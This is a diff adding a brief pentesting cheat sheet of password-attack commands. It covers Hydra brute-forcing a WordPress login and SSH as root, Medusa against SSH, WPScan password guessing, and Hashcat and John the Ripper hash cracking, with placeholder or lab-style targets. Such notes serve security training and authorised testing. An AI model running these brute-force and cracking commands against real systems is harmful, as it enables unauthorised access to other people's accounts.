@@ -1,0 +1,27 @@
+HYDRA
+
+https://github.com/frizb/Hydra-Cheatsheet
+
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
+
+WORDPRESS
+
+wpscan --url URL -U USERNAMES -P PASSWORDLIST
+
+HASHCAT
+
+hashcat -m MODE -a 0 HASH WORDLIST
+
+JOHN
+
+john --wordlist=password.lst hashfile
+
+https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf
+
+MEDUSA
+
+medusa -u root -P 500-worst-passwords.txt -h 10.10.10.10 -M ssh
+
+
